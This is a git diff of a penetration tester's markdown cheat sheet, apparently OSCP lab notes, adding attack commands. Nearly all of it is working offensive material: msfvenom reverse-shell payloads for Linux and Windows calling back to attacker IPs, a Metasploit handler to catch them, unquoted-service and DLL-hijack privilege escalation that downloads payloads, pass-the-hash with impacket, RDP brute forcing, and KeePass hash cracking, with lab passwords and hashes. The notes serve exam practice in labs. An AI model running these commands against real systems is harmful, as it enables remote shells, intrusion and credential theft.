@@ -146,7 +146,7 @@ sudo responder -I tun0
 
 ### Generating shells
 ```bash
-# this produces shell code
+# this produces shell code (don't need this much)
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.45.234 LPORT=22 -f sh -o shell.sh
 
 # this produces a bash one-liner
@@ -155,7 +155,24 @@ msfvenom -p cmd/unix/reverse_bash LHOST=192.168.45.234 LPORT=4444 -f raw -o shel
 # Generate dll
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.181 LPORT=4444 -f dll -o EnterpriseServiceOptional.dll 
 
+# windows shells
+# meterpreter staged
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.219 LPORT=4444 -f exe -o met.exe
+# shell unstaged
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.194 LPORT=4444 -f exe > reverse2.exe
+# shell staged
+msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.45.181 LPORT=443 -f exe -o staged.exe
 ```
+### Catching shells with msfconsole
+```bash
+sudo msfconsole
+use multi/handler
+set payload windows/x64/shell/reverse_tcp
+set LHOST 192.168.45.181
+set LPORT 443
+run -j
+```
+
 ### Windows privesc
 - check if access to internal network
 - run winpeas for initial overview of system
@@ -208,18 +225,27 @@ schtasks /query /fo LIST /v
 schtasks.exe /query /V /FO CSV | convertfrom-csv | where{$_.'Run as user' -match 'roy'} | select taskname
 
 # Unquoted services
+# find services
+wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
+# check for write perms on directories
 icacls "C:\"
 icacls "C:\Enterprise Software"
 icacls "C:\Enterprise Software\Monitoring Solution" # has write
 icacls "C:\Enterprise Software\Monitoring Solution\Surveillance Apps"
+# add user or create and download shell
 iwr -uri http://192.168.45.181/adduser.exe -Outfile Surveillance.exe
-copy .\Surveillance.exe 'C:\Enterprise Software\Monitoring Solution\Surveillance.exe'
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.229 LPORT=444 -f exe > Development.exe
+# restart services
 Restart-Service ReynhSurveillance 
-net user
+sc.exe start DevService
 
 # missing DLL
+# shell dll
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.181 LPORT=4444 -f dll -o EnterpriseServiceOptional.dll 
 iwr -uri http://192.168.45.219:8000/EnterpriseServiceOptional.exe -Outfile EnterpriseServiceOptional.exe
+# add user dll
+x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
+iwr -uri http://192.168.45.181/myDLL.dll -Outfile myDLL.dll
 ```
 - look for scheduled tasks
 - check powershell history for secrets
@@ -274,9 +300,11 @@ evil-winrm -i 10.10.80.148 -u sql_svc -p "Dolphin1"
 
 # pass the hash
 impacket-psexec -hashes :17add237f30abaecc9d884f72958b928 Administrator@10.10.76.13 
+impacket-wmiexec -hashes :9a3121977ee93af56ebd0ef4f527a35e mary.williams@192.168.225.141
 
 # rdp
 crowbar -b rdp -s 10.10.80.148/32 -u sql_svc -c "Dolphin1" -n 1
+xfreerdp /u:Administrator /p:DowntownAbbey1923 /d:SKYLARK /v:192.168.194.227
 
 # mssql
 crackmapexec mssql -d oscp.exam -u sql_svc -p 'Dolphin1' -X "whoami" 10.10.80.148
@@ -396,6 +424,8 @@ keepass2john Database.kdbx > keepass2.hash
 hashcat -m 13400 keepass2.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 
 # got password - mercedes1
+sudo apt search keepass cli
+sudo apt-get install kpcli
 kpcli --kdb=/home/kali/relia/Database2.kdbx
 cd /Database/General
 show 0
